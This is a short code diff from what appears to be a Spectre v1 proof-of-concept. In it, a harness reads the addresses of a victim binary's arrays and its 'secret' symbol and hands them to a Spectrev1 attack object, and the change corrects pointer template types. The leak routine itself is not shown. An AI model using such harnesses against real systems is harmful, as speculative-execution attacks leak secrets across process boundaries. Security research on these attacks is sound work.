@@ -17,12 +17,12 @@ int main()
 {
     auto du_pipes = DuplexPipe(VICTIM_BIN, NULL);
     auto victim = LilElf(VICTIM_BIN);
-    auto m_array1_size = victim.get_sym_value<void>(victim.get_sym("_ZL11array1_size"));
-    auto m_array1 = victim.get_sym_value<void>(victim.get_sym("_ZL6array1"));
-    auto m_array2 = victim.get_sym_value<void>(victim.get_sym("_ZL6array2"));
+    auto m_array1_size = victim.get_sym_value<void*>(victim.get_sym("_ZL11array1_size"));
+    auto m_array1 = victim.get_sym_value<void*>(victim.get_sym("_ZL6array1"));
+    auto m_array2 = victim.get_sym_value<void*>(victim.get_sym("_ZL6array2"));
 
     auto sym_secret = victim.get_sym("secret");
-    auto m_secret = victim.get_sym_value<uint8_t>(sym_secret);
+    auto m_secret = victim.get_sym_value<uint8_t*>(sym_secret);
 
     Spectrev1 s(m_array1,
                 m_array2,
